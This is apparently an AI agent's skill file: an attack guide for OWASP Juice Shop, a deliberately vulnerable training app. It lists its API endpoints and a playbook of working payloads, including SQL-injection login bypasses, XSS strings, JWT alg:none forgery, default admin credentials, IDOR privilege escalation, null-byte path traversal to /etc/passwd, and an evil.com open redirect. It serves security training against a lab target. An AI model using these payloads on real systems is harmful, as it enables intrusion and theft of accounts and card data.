---
name: owasp-juice-shop
description: Attack strategies for OWASP Juice Shop — an intentionally vulnerable web application with 100+ challenges
---

# OWASP Juice Shop Attack Guide

Juice Shop is a modern Angular + Express.js + SQLite application with 100+ intentional vulnerabilities across all OWASP categories. It uses JWT for auth, REST APIs, and has a rich attack surface.

## Technology Stack
- Frontend: Angular SPA (client-side routing, #/ hash routes)
- Backend: Node.js + Express.js
- Database: SQLite (via sequelize ORM)
- Auth: JWT tokens (check `Authorization: Bearer <token>`)
- API docs: Swagger at `/api-docs` (if exposed)

## CRITICAL: SPA Endpoint Discovery
Katana/crawlers find very few URLs on Angular SPAs. Instead:
1. **Fetch main.js**: `GET /main.js` or `GET /main-es2015.*.js` — contains ALL API routes
2. **Check /api-docs**: Returns Swagger/OpenAPI spec with all REST endpoints
3. **Check /rest/**: Most custom APIs are under `/rest/`
4. **Check /api/**: CRUD endpoints are under `/api/`
5. **Known paths file**: `GET /ftp` — may expose sensitive files

## Key API Endpoints

### Authentication
- `POST /rest/user/login` — Login (email + password in JSON body)
- `POST /api/Users` — Register new user
- `GET /rest/user/whoami` — Current user info
- `POST /rest/user/change-password` — Password change
- `GET /rest/user/security-question` — Security questions

### User Data (IDOR targets)
- `GET /api/Users` — List all users (auth required)
- `GET /api/Users/:id` — Get specific user
- `PUT /api/Users/:id` — Update user (role escalation)
- `GET /api/Cards` — Credit cards
- `GET /api/Addresss` — Addresses (note: double 's')
- `DELETE /api/Users/:id` — Delete user

### Shopping (Business Logic)
- `GET /api/Products` — All products
- `GET /api/Products/:id` — Single product
- `GET /api/BasketItems` — Basket items
- `POST /api/BasketItems` — Add to basket (quantity manipulation)
- `PUT /api/BasketItems/:id` — Update quantity (negative quantity = free items)
- `GET /rest/basket/:id` — View basket (IDOR: try other user IDs)
- `POST /rest/basket/:id/checkout` — Checkout
- `POST /api/Quantitys` — Quantity manipulation

### Feedback & Reviews
- `GET /api/Feedbacks` — All feedback
- `POST /api/Feedbacks` — Create feedback (XSS in comment field)
- `GET /api/Products/:id/reviews` — Product reviews
- `PUT /api/Products/:id/reviews` — Edit review (auth bypass)
- `PATCH /api/Products/:id/reviews` — Modify review

### File Access
- `GET /ftp` — FTP directory listing (path traversal)
- `GET /ftp/:filename` — Download file (null byte bypass: `file.md%2500.md`)
- `GET /support/logs` — Application logs  
- `GET /encryptionkeys` — Encryption keys directory
- `GET /encryptionkeys/jwt.pub` — JWT public key

### Admin
- `GET /rest/admin/application-configuration` — App config
- `GET /api/Challenges` — All challenges list
- `GET /api/SecurityQuestions` — Security questions

### Search & Content  
- `GET /rest/products/search?q=` — Search (SQL injection!)
- `GET /rest/memories` — Photo memories
- `POST /rest/memories` — Upload memory (file upload)
- `GET /rest/track-order/:id` — Track order (injection)
- `GET /rest/saveLoginIp` — Save login IP (header injection)
- `GET /redirect?to=` — URL redirect (open redirect)
- `POST /file-upload` — File upload
- `POST /profile/image/file` — Profile image upload (type bypass)

## Vulnerability Playbook (50+ bugs)

### 1. SQL Injection (5+ variants)
- `GET /rest/products/search?q='))--` — SQLi in search
- `POST /rest/user/login` with `{"email":"' OR 1=1--","password":"x"}` — Auth bypass  
- `GET /rest/track-order/' OR 1=1--` — Order tracking SQLi
- `POST /rest/user/login` with `{"email":"admin@juice-sh.op'--","password":"x"}` — Admin login
- Any sequelize raw query endpoint

### 2. XSS (5+ variants)
- Search field: `/rest/products/search?q=<iframe src="javascript:alert('xss')">`
- User registration with XSS in username
- Feedback form: `POST /api/Feedbacks` with HTML in comment
- DOM XSS via `/#/search?q=<script>` (Angular route)
- Product review XSS

### 3. Broken Authentication (5+ variants)
- Default admin: `admin@juice-sh.op` / `admin123`
- Password reset via security question brute-force
- JWT none algorithm: Modify JWT header to `{"alg":"none"}`, remove signature
- Weak JWT secret: Try common secrets like `secret`, empty string
- OAuth login manipulation
- Password change without current password

### 4. IDOR / Broken Access Control (5+ variants)
- `GET /rest/basket/1`, `/rest/basket/2` — View other users' baskets
- `GET /api/Users/1`, `/api/Users/2` — Access other user profiles
- `PUT /api/Users/1` with `{"role":"admin"}` — Privilege escalation
- `GET /api/Cards` — Access other users' credit cards
- View other users' orders by ID enumeration
- Access admin section without admin role: `/#/administration`

### 5. Sensitive Data Exposure (5+ variants)
- `GET /ftp` — Directory listing with sensitive files
- `GET /ftp/package.json.bak%2500.md` — Null byte bypass to download backups
- `GET /encryptionkeys/jwt.pub` — JWT public key exposed
- Error messages revealing stack traces (send malformed JSON)
- `GET /support/logs` — Access support logs
- `GET /metrics` — Prometheus metrics
- `GET /api/Challenges` — Shows all challenges and their solved status
- `GET /main.js` — Source code with hardcoded secrets

### 6. Security Misconfiguration (3+ variants)
- Missing CORS headers / overly permissive CORS
- Verbose error pages (send invalid JSON to any POST endpoint)  
- HTTP security headers missing (CSP, HSTS, X-Frame-Options)
- Admin endpoints accessible without auth

### 7. Path Traversal (3+ variants)
- `GET /ftp/../../etc/passwd` — Classic traversal (may be blocked)
- `GET /ftp/eastere.gg%2500.md` — Null byte injection to bypass extension check
- Poison null byte in file download: `%00` / `%2500`

### 8. Open Redirect
- `GET /redirect?to=https://evil.com` — Check allowlist bypass
- Try URL encoding, double encoding, `//evil.com`, `\/\/evil.com`

### 9. File Upload (2+ variants)
- Upload `.xml` file to trigger XXE via `/file-upload`
- Upload oversized file (bypass size limit)
- Upload file with executable content but allowed extension

### 10. Business Logic Flaws (5+ variants)
- Negative quantity in basket: `PUT /api/BasketItems/:id` with `{"quantity":-1}`
- Zero-star feedback: `POST /api/Feedbacks` with `{"rating":0}`
- Coupon code manipulation (try expired/test coupons)
- Extra payment with negative amount
- Self-referral for bonus
- Manipulate total price during checkout

### 11. NoSQL/Injection Variants
- NoSQL injection if MongoDB endpoints exist
- XML External Entity (XXE) via file upload
- Server-Side Template Injection via product review

### 12. HTTP Header Injection
- `GET /rest/saveLoginIp` — X-Forwarded-For header injection
- Host header injection for password reset poisoning

## Auth Strategy
1. First: Try SQL injection login bypass: `' OR 1=1--`  
2. If that works, extract the JWT from response `authentication.token`
3. Use the JWT for all authenticated testing
4. Create a second normal user account for IDOR testing
5. Try admin endpoints with both tokens to test access control

## Efficiency Tips
- Start with `/api-docs` or `/main.js` to map ALL endpoints in one request
- Login FIRST before testing — most vulns need auth
- Test each endpoint with at least: normal request, auth bypass, injection, IDOR
- Remember: Angular hides routes behind `/#/` — use the REST API directly
- The `q` parameter in search is the easiest SQLi entry point
